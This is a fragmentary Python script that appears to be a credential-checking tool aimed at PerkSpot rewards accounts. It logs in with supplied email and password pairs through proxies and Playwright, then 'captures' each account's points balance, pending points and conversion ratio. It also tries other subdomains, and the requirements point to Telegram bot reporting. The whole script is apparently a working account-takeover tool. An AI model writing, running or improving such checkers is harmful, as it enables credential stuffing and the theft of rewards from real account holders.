...
=====================================
Run: python3 perk.py
Requirements: pip install python-telegram-bot==20.7 curl_cffi playwright rarfile
"""
...
def fetch_points_via_browser(email, password):
    ...
    if cdp_ws:
        try:
            with sync_playwright() as p:
                ...
                # Navigate to login
                page.goto("https://anything.perkspot.com/login")
                page.wait_for_load_state("domcontentloaded")
                page.wait_for_timeout(1000)
                
                if "signin.perkspot.com" in page.url or "anything.perkspot.com/login" in page.url:
                    if page.query_selector("#floatingEmail"):
                        page.fill("#floatingEmail", email)
                        page.click('button:has-text("Continue")')
                        page.wait_for_timeout(1500)
                        
                    if page.query_selector('button:has-text("Sign in with Password")'):
                ...
                pts_res = page.evaluate('''() => {
                    return fetch('/api/credits/rewardcurrency')
                        .then(r => r.json())
                        .catch(e => null)
                }''')
                
                if isinstance(pts_res, dict) and pts_res.get("resultCode") == "Success":
                    pts_info = pts_res.get("data", {})
        except Exception as e:
            log.debug(f"Playwright points capture error for {email}: {e}")
...
def check_account(email, password, proxy="", capture_on=None):
    ...
    try:
        ...
        # Try capturing points via browser session if points capture enabled
        if co.get("points", True) or co.get("balance", True):
            pts_info = fetch_points_via_browser(email, password)
            if pts_info:
                captured["perk_points"] = {
                    "balance": pts_info.get("balance", 0.0),
                    "pending": pts_info.get("pending", 0.0),
                    "conversion_ratio": pts_info.get("conversionRatio", 100),
                    "use_points": pts_info.get("usePoints", True)
                }
            else:
                # Fallback check on known subdomains via session
                for sub in ["fedex", "ps"]:
                    try:
